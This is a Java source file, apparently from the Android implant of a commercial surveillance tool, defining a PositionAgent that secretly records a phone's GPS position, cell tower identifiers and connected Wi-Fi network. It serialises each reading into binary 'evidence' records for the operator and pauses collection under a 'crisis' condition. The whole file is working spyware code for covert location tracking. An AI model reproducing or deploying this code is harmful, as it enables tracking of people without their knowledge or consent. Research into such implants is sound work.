package com.ht.RCSAndroidGUI.agent;

import java.io.EOFException;
import java.io.IOException;
import java.util.Date;

import com.ht.RCSAndroidGUI.CellInfo;
import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.LogR;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.agent.position.GPSLocator;
import com.ht.RCSAndroidGUI.agent.position.GPSLocatorPeriod;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.evidence.Evidence;
import com.ht.RCSAndroidGUI.evidence.EvidenceType;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.DateTime;
import com.ht.RCSAndroidGUI.util.Utils;

import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class PositionAgent extends AgentBase implements LocationListener {
	private static final String TAG = "PositionAgent";
	private static final int TYPE_GPS = 1;
	private static final int TYPE_CELL = 2;
	private static final int TYPE_WIFI = 4;

	private static final int LOG_TYPE_GPS = 1;
	private static final int LOG_TYPE_GSM = 2;
	private static final int LOG_TYPE_WIFI = 3;
	private static final int LOG_TYPE_IP = 4;
	private static final int LOG_TYPE_CDMA = 5;
	private static final long POSITION_DELAY = 1000;

	GPSLocator locator;

	private boolean gpsEnabled;
	private boolean cellEnabled;
	private boolean wifiEnabled;

	int period;

	@Override
	public void begin() {

		locator = new GPSLocatorPeriod(this, period);
		locator.start();

	}

	@Override
	public void end() {
		locator.halt();
		try {
			locator.join();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		locator = null;
	}

	@Override
	public boolean parse(byte[] confParameters) {
		final DataBuffer databuffer = new DataBuffer(confParameters, 0,
				confParameters.length);
		try {
			// millisecondi
			period = databuffer.readInt();
			final int type = databuffer.readInt();

			if (Configuration.GPS_ENABLED) {
				gpsEnabled = ((type & TYPE_GPS) != 0);
			} else {
				// #ifdef DEBUG
				Log.d("QZ", TAG + " Warn: " + "GPS Disabled at compile time");
				// #endif
			}
			cellEnabled = ((type & TYPE_CELL) != 0);
			wifiEnabled = ((type & TYPE_WIFI) != 0);

			// #ifdef DBC
			Check.asserts(period > 0, "parse period: " + period);
			// Check.asserts(type == 1 || type == 2 || type == 4, "parse type: "
			// + type);
			// #endif

			// #ifdef DEBUG
			Log.d("QZ", TAG + " Info: " + "Type: " + type);
			Log.d("QZ", TAG + " Info: " + "Period: " + period);
			Log.d("QZ", TAG + " Info: " + "gpsEnabled: " + gpsEnabled);
			Log.d("QZ", TAG + " Info: " + "cellEnabled: " + cellEnabled);
			Log.d("QZ", TAG + " Info: " + "wifiEnabled: " + wifiEnabled);
			// #endif

			setPeriod(period);
			setDelay(POSITION_DELAY);

		} catch (final IOException e) {
			// #ifdef DEBUG
			Log.d("QZ", TAG + " Error: " + e.toString());
			// #endif
			return false;
		}

		return true;
	}

	@Override
	public void go() {

		if (Status.self().crisisPosition()) {
			Log.d("QZ", TAG + " Warn: " + "Crisis!");
			return;
		}

		if (gpsEnabled) {
			// #ifdef DEBUG
			Log.d("QZ", TAG + " actualRun: gps");
			// #endif
			locationGPS();
		}
		if (cellEnabled) {
			// #ifdef DEBUG
			Log.d("QZ", TAG + " actualRun: cell");
			// #endif
			locationCELL();
		}
		if (wifiEnabled) {
			// #ifdef DEBUG
			Log.d("QZ", TAG + " actualRun: wifi");
			// #endif
			locationWIFI();
		}
	}

	private void locationWIFI() {
		WifiManager wifiManager = (WifiManager) Status.getAppContext()
				.getSystemService(Context.WIFI_SERVICE);

		WifiInfo wifi = wifiManager.getConnectionInfo();

		if (wifi != null && wifi.getBSSID() != null) {
			// #ifdef DEBUG
			Log.d("QZ", TAG + " Info: " + "Wifi: " + wifi.getBSSID());
			// #endif
			final byte[] payload = getWifiPayload(wifi.getBSSID(),
					wifi.getSSID(), wifi.getRssi());

			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
					getAdditionalData(1, LOG_TYPE_WIFI), payload);

			// logWifi.createEvidence(getAdditionalData(1, LOG_TYPE_WIFI),
			// EvidenceType.LOCATION_NEW);
			// logWifi.writeEvidence(payload);
			// logWifi.close();
		} else {
			// #ifdef DEBUG
			Log.d("QZ", TAG + " Warn: " + "Wifi disabled");
			// #endif
		}

	}

	/**
	 * http://stackoverflow.com/questions/3868223/problem-with-
	 * neighboringcellinfo-cid-and-lac
	 */
	private void locationCELL() {

		CellInfo info = Device.getCellInfo();
		if (!info.valid) {
			Log.d("QZ", TAG + " Error: " + "invalid cell info");
			return;
		}

		if (info.gsm) {
			final byte[] payload = getCellPayload(info, LOG_TYPE_GSM);
			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
					getAdditionalData(0, LOG_TYPE_GSM), payload);
		}
		if (info.cdma) {
			final byte[] payload = getCellPayload(info, LOG_TYPE_CDMA);
			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
					getAdditionalData(0, LOG_TYPE_CDMA), payload);
		}
	}

	private void locationGPS() {
		if (locator == null) {
			Log.d("QZ", TAG + " Error: " + "GPS Not Supported on Device");
			return;
		}

		if (lastLocation == null) {
			Log.d("QZ", TAG + " waitingForPoint");

			return;
		}

		// #ifdef DEBUG
		Log.d("QZ", TAG + " newLocation");
		// #endif

		byte[] payload;
		synchronized (this) {
			final long timestamp = lastLocation.getTime();

			// #ifdef DEBUG
			Log.d("QZ", TAG + " valid");
			// #endif
			payload = getGPSPayload(lastLocation, timestamp);
			lastLocation = null;
		}

		new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
		 getAdditionalData(0, LOG_TYPE_GPS), payload);

		/*Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
		logGPS.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
				EvidenceType.LOCATION_NEW);
		logGPS.writeEvidence(payload);
		logGPS.close();*/

	}

	Location lastLocation;

	public void onLocationChanged(Location location) {
		if (location != null) {
			double lat = location.getLatitude();
			double lng = location.getLongitude();
			Log.d("QZ", TAG + " lat: " + lat + " lon:" + lng);
		}
		synchronized (this) {
			lastLocation = location;
		}

	}

	public void onProviderDisabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onProviderEnabled(String arg0) {
		// TODO Auto-generated method stub

	}

	public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
		// TODO Auto-generated method stub

	}

	private byte[] getAdditionalData(int structNum, int type) {

		final int addsize = 12;
		final byte[] additionalData = new byte[addsize];
		final DataBuffer addbuffer = new DataBuffer(additionalData, 0,
				additionalData.length);
		final int version = 2010082401;

		addbuffer.writeInt(version);
		addbuffer.writeInt(type);
		addbuffer.writeInt(structNum);

		// #ifdef DBC
		Check.ensures(addbuffer.getPosition() == addsize,
				"addbuffer wrong size");
		// #endif

		return additionalData;
	}

	private byte[] messageEvidence(byte[] payload, int type) {

		// #ifdef DBC
		Check.requires(payload != null, "saveEvidence payload!= null");
		// #endif

		// #ifdef DEBUG
		Log.d("QZ", TAG + " saveEvidence payload: " + payload.length);
		// #endif

		final int version = 2008121901;
		final Date date = new Date();
		final int payloadSize = payload.length;
		final int size = payloadSize + 24;

		final byte[] message = new byte[size];

		final DataBuffer databuffer = new DataBuffer(message, 0, size);

		databuffer.writeInt(type);

		// header
		databuffer.writeInt(size);
		databuffer.writeInt(version);
		databuffer.writeLong(DateTime.getFiledate(date));

		// payload
		databuffer.write(payload);

		// delimiter
		databuffer.writeInt(Evidence.EVIDENCE_DELIMITER);

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"saveEvidence wrong size");
		// #endif

		// save log

		return message;

	}

	private byte[] getWifiPayload(String bssid, String ssid, int signalLevel) {
		Log.d("QZ", TAG + " getWifiPayload bssid: " + bssid + " ssid: " + ssid
				+ " signal:" + signalLevel);
		final int size = 48;
		final byte[] payload = new byte[size];

		final DataBuffer databuffer = new DataBuffer(payload, 0, payload.length);

		for (int i = 0; i < 6; i++) {
			final byte[] token = Utils.hexStringToByteArray(bssid, i * 3, 2);
			// #ifdef DEBUG
			// debug.trace("getWifiPayload " + i + " : "
			// + Utils.byteArrayToHex(token));
			// #endif

			// #ifdef DBC
			Check.asserts(token.length == 1, "getWifiPayload: token wrong size");
			// #endif
			databuffer.writeByte(token[0]);
		}

		// PAD
		databuffer.writeByte((byte) 0);
		databuffer.writeByte((byte) 0);

		final byte[] ssidcontent = ssid.getBytes();
		final int len = ssidcontent.length;
		final byte[] place = new byte[32];

		for (int i = 0; i < (Math.min(32, len)); i++) {
			place[i] = ssidcontent[i];
		}

		// #ifdef DEBUG
		Log.d("QZ", TAG + " getWifiPayload ssidcontent.length: " + ssidcontent.length);
		// #endif
		databuffer.writeInt(ssidcontent.length);

		databuffer.write(place);

		databuffer.writeInt(signalLevel);

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"databuffer.getPosition wrong size");
		// #endif

		// #ifdef DBC
		Check.ensures(payload.length == size, "payload wrong size");
		// #endif

		return payload;
	}

	private byte[] getCellPayload(CellInfo info, int logType) {
		Check.requires(info.valid, "invalid cell info");

		final int size = 19 * 4 + 48 + 16;
		final byte[] cellPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(cellPosition, 0,
				cellPosition.length);

		databuffer.writeInt(size); // size
		databuffer.writeInt(0); // params

		databuffer.writeInt(info.mcc); //
		databuffer.writeInt(info.mnc); //
		databuffer.writeInt(info.lac); //
		databuffer.writeInt(info.cid); //

		databuffer.writeInt(0); // bsid
		databuffer.writeInt(0); // bcc

		databuffer.writeInt(info.rssi); // rx level
		databuffer.writeInt(0); // rx level full
		databuffer.writeInt(0); // rx level sub

		databuffer.writeInt(0); // rx quality
		databuffer.writeInt(0); // rx quality full
		databuffer.writeInt(0); // rx quality sub

		databuffer.writeInt(0); // idle timeslot
		databuffer.writeInt(0); // timing advance
		databuffer.writeInt(0); // gprscellid
		databuffer.writeInt(0); // gprs basestationid
		databuffer.writeInt(0); // num bcch

		databuffer.write(new byte[48]); // BCCH
		databuffer.write(new byte[16]); // NMR

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"getCellPayload wrong size");
		// #endif

		return messageEvidence(cellPosition, logType);

	}

	/**
	 * @param timestamp
	 */
	private byte[] getGPSPayload(Location loc, long timestamp) {
		// #ifdef DEBUG
		Log.d("QZ", TAG + " getGPSPayload");
		// #endif
		final Date date = new Date(timestamp);

		final double latitude = loc.getLatitude();
		final double longitude = loc.getLongitude();
		final double altitude = loc.getAltitude();
		final float hdop = loc.getAccuracy();
		final float vdop = 0;
		final float speed = loc.getSpeed();
		final float course = loc.getBearing();

		Log.d("QZ", TAG + " " + " " + speed + "|" + latitude + "|" + longitude + "|"
				+ course + "|" + date);

		final DateTime dateTime = new DateTime(date);

		// define GPS_VALID_UTC_TIME 0x00000001
		// define GPS_VALID_LATITUDE 0x00000002
		// define GPS_VALID_LONGITUDE 0x00000004
		// define GPS_VALID_SPEED 0x00000008
		// define GPS_VALID_HEADING 0x00000010
		// define GPS_VALID_HORIZONTAL_DILUTION_OF_PRECISION 0x00000200
		// define GPS_VALID_VERTICAL_DILUTION_OF_PRECISION 0x00000400
		final int validFields = 0x00000400 | 0x00000200 | 0x00000010
				| 0x00000008 | 0x00000004 | 0x00000002 | 0x00000001;

		final int size = 344;
		// struct GPS_POSITION
		final byte[] gpsPosition = new byte[size];

		final DataBuffer databuffer = new DataBuffer(gpsPosition, 0,
				gpsPosition.length);

		// struct GPS_POSITION
		databuffer.writeInt(0); // version
		databuffer.writeInt(size); // sizeof GPS_POSITION == 344
		databuffer.writeInt(validFields); // validFields
		databuffer.writeInt(0); // flags

		// ** Time related : 16 bytes
		databuffer.write(dateTime.getStructSystemdate()); // SYSTEMTIME

		// ** Position + heading related
		databuffer.writeDouble(latitude); // latitude
		databuffer.writeDouble(longitude); // longitude
		databuffer.writeFloat(speed); // speed
		databuffer.writeFloat(course); // heading
		databuffer.writeDouble(0); // Magnetic variation
		databuffer.writeFloat((float) altitude); // altitude
		databuffer.writeFloat(0); // altitude ellipsoid

		// ** Quality of this fix
		databuffer.writeInt(1); // GPS_FIX_QUALITY GPS
		databuffer.writeInt(2); // GPS_FIX_TYPE 3D
		databuffer.writeInt(0); // GPS_FIX_SELECTION
		databuffer.writeFloat(0); // PDOP
		databuffer.writeFloat(hdop); // HDOP
		databuffer.writeFloat(vdop); // VDOP

		// ** Satellite information
		databuffer.writeInt(0); // satellite used
		databuffer.write(new byte[48]); // prn used 12 int
		databuffer.writeInt(0); // satellite view
		databuffer.write(new byte[48]); // prn view
		databuffer.write(new byte[48]); // elevation in view
		databuffer.write(new byte[48]); // azimuth view
		databuffer.write(new byte[48]); // sn view

		// #ifdef DEBUG
		Log.d("QZ", TAG + " len: " + databuffer.getPosition());
		// #endif

		// #ifdef DBC
		Check.ensures(databuffer.getPosition() == size,
				"saveGPSLog wrong size: " + databuffer.getPosition());
		// #endif

		return messageEvidence(gpsPosition, LOG_TYPE_GPS);

	}

}
